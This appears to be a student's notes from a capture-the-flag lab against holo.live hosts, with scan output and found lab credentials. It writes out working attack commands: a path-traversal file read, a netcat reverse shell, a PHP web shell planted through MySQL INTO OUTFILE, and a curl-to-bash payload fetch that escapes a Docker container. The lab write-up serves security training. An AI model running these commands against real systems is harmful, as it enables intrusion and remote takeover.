OS: Ubuntu (docker container → )
Web Technology: Apache (wordpress 5.5.3)
IP: 10.200.69.33
FLAG:
HOLO{175d7322f8fc53392a417ccde356c3fe}
USERS:
admin
Korone Inugami
Fubuki Shirakami
Miko Sakura
Okayu Nekomata
Matsuri Natsuiro
Watame Tsunomaki
Gura Gawr
Coco Kiryu
Amelia Watson

CREDENTIALS:
admin:DBManagerLogin! (dashboard login)
admin:!123SecureAdminDashboard321! (remote database login)

#####################################################
Community Attack Vectors (To-Try List):

80 --> http --> VHost Fuzzing --> Directory/File Fuzzing --> Manual Inspection --> wpscan --> 

www.holo.live --> inspect comment field --> generate password list with strings on the webpage --> file inclusion fuzzing -->

dev.holo.live --> image file inclusion --> inspect image metadata --> generate username list and password list --> 

admin.holo.live --> 

22 --> ssh -->

33060 --> mysqlx -->

#####################################################
NMAP RESULTS: 10.200.69.33
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 12:06:19:83:8d:a5:7c:60:7c:31:1e:e6:23:44:00:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0TcLThDcw98pkJl3cVN2JV74NGOLMV0oQoNy8lrfBpdp5xhTmHm0R3Jvqnm/SL8a9rKDHXreXiUn1XG+Ad4LznzfqoxmP7/1F0RLqXqg7T4SAtEeLjAQJ4zD2At7I9VM4YHzQUNpkbayelUTLqRGAd0TAUcACzbIAC6NdSyHGtbq4Yx9kRSQBJgFe/toR0agaPuPjsQMpkEjbVpoCLWnx/ZpxEbTqs63HCJmwiRWhKmGEAmQtk+gOXqc34ldwoWSX5i+e7S0bMFnCLsIWfejOXRclvXvhrMa+YfO8ziMFBGntxd7ITRsznGe44tsV6ec00Iaf/qgTX7LmEgmNIGiTRyHf3DcI2b/YbPGG8VYvxPUTQYehckJSCILJtciECeHgkXWSAGmBa0ZVocKeC1FNiMk5UJswsvnD0mXzsqAOKdzsCmGJc5N89fH+DiDrFI9KmQ/Ipnr4NEapgCAlsJNXJUT+akOqAUvdE/1EFZHXOCmOgCnP6qymQWJTQ4W7YGs=
|   256 c7:f9:86:c5:36:5d:84:ec:7a:57:7c:7b:13:e9:84:d6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNZ3FbuAaZizkI4V8DtDuQJGZTTS/Jq6nuL1H3pXiGwi8oNiRdia0vzWMlP5Ci25eXt5O/wCeeGI3GWPem33afc=
|   256 f7:c8:49:7b:e9:be:4d:1a:eb:30:bd:6c:8e:d5:20:db (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICwzb7Pkv+VbSbUJd1SKn0H3onlTmucQXof5LkMi3Myo

80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 21 disallowed entries
| /var/www/wordpress/index.php
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade
| /var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
| /var/www/wordpress/wp-config-sample.php /var/www/wordpress/wp-cron.php
| /var/www/wordpress/wp-links-opml.php /var/www/wordpress/wp-login.php
|_/var/www/wordpress/wp-settings.php /var/www/wordpress/wp-trackback.php
|_http-title: holo.live
|_http-generator: WordPress 5.5.3
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
33060/tcp open  mysqlx? syn-ack ttl 62

#####################################################
Steps Taken():
[+] Initiated NMap scan 
[+] nmap -A -sV -p- -vvv -oN scan $IP -Pn -n -f --open
[+] VHost scanning: www.holo.live; admin.holo.live; dev.holo.live
[+] WPScan: user admin
[+] dev.holo.live: possible usernames
[+] admin.holo.live: robots.txt /supersecretdir/creds.txt
[+] dev.holo.live/img.php?file=../../../../../etc/passwd: LFI Vulnerability
[+] http://dev.holo.live/img.php?file=../../../../../../var/www/admin/supersecretdir/creds.txt
-→ reveals the user credentials for admin:DBManagerLogin!
[+] www.holo.live: comment field accepts web address, awaits moderator interaction
[+] http://admin.holo.live/dashboard.php accessable with the credentials
[+] LFI vulnerability with the ‘cmd’ parameter
[+] admin.holo.live/dashboard.php?cmd=nc+10.50.70.38+4444+-e+/bin/bash 
[+] Reverse shell obtained
[+]  / directory reveals .dockerenv file → web page lives in a docker container
[+] /proc/1/cgroup → further indicates this is a docker container
[+] arp -a to identify hosts in other subnets
[+] custom python script to port scan the identified host 
[+] to obtain a reverse shell on the host machine:
→ access the remote database using administrator credentials
→ create a new table in the main database
→ inject php code to gain command execution
   ⇒ <?php $cmd=$_GET["cmd"];system($cmd);?>
→ select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
[+] The host machine now has exploitable code being hosted in /var/www/html/shell.php
→ by making a request from the docker container, we can execute code on the host machine
→ the code we execute can curl a request to our local machine through the docker container
→ the payload we serve can open a reverse shell on a port of our choosing
[+] curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.108.214%3A80%2FrevShell.sh%7Cbash%20%26'
[+] this gives us a reverse shell on the host machine, the docker container is escaped
#####################################################
Web Services Enumeration:  

[  +  WPScan  ]
# www.holo.live
[+] URL: http://www.holo.live/ [10.200.69.33]
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.29 (Ubuntu)
 |  - X-UA-Compatible: IE=edge
[+] robots.txt found: http://www.holo.live/robots.txt
[+] XML-RPC seems to be enabled: http://www.holo.live/xmlrpc.php
[+] WordPress readme found: http://www.holo.live/readme.html
[+] The external WP-Cron seems to be enabled: http://www.holo.live/wp-cron.php
[+] WordPress version 5.5.3 identified (Insecure, released on 2020-10-30).
[+] WordPress theme in use: generatepress
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://www.holo.live/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)


[  +  NIKTO   ]


[  +  WFUZZ   ]

FILES:   /   (Web Root)
http://dev.holo.live/FUZZ.php
"index"
"img"
"about"
“talents”

http://holo.live/FUZZ.php 
"wp-trackback"

http://admin.holo.live/FUZZ.php
"index"

DIRECTORIES:  /  (Web Root)
gobuster dir -u http://dev.holo.live -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 30
/css                  		(Status: 301) [Size: 312]
/login                		(Status: 403) [Size: 278]
/javascript          		(Status: 301) [Size: 319]
/fonts                		(Status: 301) [Size: 314]
/images               	(Status: 301) [Size: 315]
/js                   			(Status: 301) [Size: 311]
/admin                	(Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]


gobuster dir -u http://admin.holo.live -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 30
/docs                 		(Status: 301) [Size: 317]
/assets               		Status: 301) [Size: 319]
/javascript          		(Status: 301) [Size: 323]
/examples             	(Status: 301) [Size: 321]
/server-status        (Status: 403) [Size: 280]


gobuster dir -u http://www.holo.live -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 30

/login						(Status: 302) [Size: 0] 
/wp-admin             (Status: 403) [Size: 278]
/admin                	(Status: 302) [Size: 0] 
/wp-content           (Status: 301) [Size: 319] 
/wp-includes          (Status: 301) [Size: 320] 
/javascript           	(Status: 301) [Size: 319] 
/upgrade              	(Status: 301) [Size: 316] 
/dashboard            (Status: 302) [Size: 0]
/wp-login             	(Status: 403) [Size: 278]
/0                    			(Status: 301) [Size: 0]
/}                    			(Status: 301) [Size: 0]
/server-status         (Status: 403) [Size: 278]
/fixed!						(Status: 301) [Size: 0]
/!                    			(Status: 301) [Size: 0] 
/a0}                  		(Status: 301) [Size: 0]


VHOST:  /  (Subdomain)
www.holo.live
dev.holo.live
admin.holo.live


#####################################################
OTHER:  
www.holo.live (robots.txt)
Disallow: /var/www/wordpress/index.php
Disallow: /var/www/wordpress/readme.html
Disallow: /var/www/wordpress/wp-activate.php
Disallow: /var/www/wordpress/wp-blog-header.php
Disallow: /var/www/wordpress/wp-config.php
Disallow: /var/www/wordpress/wp-content
Disallow: /var/www/wordpress/wp-includes
Disallow: /var/www/wordpress/wp-load.php
Disallow: /var/www/wordpress/wp-mail.php
Disallow: /var/www/wordpress/wp-signup.php
Disallow: /var/www/wordpress/xmlrpc.php
Disallow: /var/www/wordpress/license.txt
Disallow: /var/www/wordpress/upgrade
Disallow: /var/www/wordpress/wp-admin
Disallow: /var/www/wordpress/wp-comments-post.php
Disallow: /var/www/wordpress/wp-config-sample.php
Disallow: /var/www/wordpress/wp-cron.php
Disallow: /var/www/wordpress/wp-links-opml.php
Disallow: /var/www/wordpress/wp-login.php
Disallow: /var/www/wordpress/wp-settings.php
Disallow: /var/www/wordpress/wp-trackback.php

dev.holo.live (robots.txt)
NONE
admin.holo.live (robots.txt)
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt

######################################################
PRIVILEGE ESCALATION:
www-data@2f8cf75e2c80:/$ ls -lah
total 340K
drwxr-xr-x   1 root root 4.0K Apr 24 21:07 .
drwxr-xr-x   1 root root 4.0K Apr 24 21:07 ..
-rwxr-xr-x   1 root root    0 Apr 24 21:07 .dockerenv

www-data@2f8cf75e2c80:/proc/1$ pwd
/proc/1
www-data@2f8cf75e2c80:/proc/1$ cat cgroup
12:pids:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
11:freezer:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
10:devices:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
9:perf_event:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
8:net_cls,net_prio:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
7:memory:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
6:blkio:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
5:hugetlb:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
4:cpu,cpuacct:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
3:cpuset:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
2:rdma:/
1:name=systemd:/docker/2f8cf75e2c8041293137d97abd2c5c67900453e0b8f242885dc43241644b0663
0::/system.slice/containerd.service

ports.py
Port  22  is open
Port  80  is open
Port  3306  is open
Port  8080  is open

/var/www/admin
<?php
define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');
$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);
if($connection == false){
        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
#####################################################
Take Away Concepts:
→ Know the signs of containerization 
→ A critical part of situational awareness is identifying network and host information. This can be done via port scanning and network tooling.
→ In bash, we can utilize /dev/tcp/ipaddr/port; this will act as a built-in scanner to gather information on the container ports
→ use custom port scanners to scanner hosts only the compromised machine can connect to
--> with admin access to the mysql database being hosted on the host machine, we can create a table that holds malicious php code and output that tables contents to a file in /var/www/html so that its hosted on the host machines webserver 
--> from the docker container we can curl a request to the host machine that gives us code execution
--> the code execution allows us to make a curl request on the host machine to our local machine to retrieve a malicious payload
--> the malicious payload creates a reverse shell to our local machine
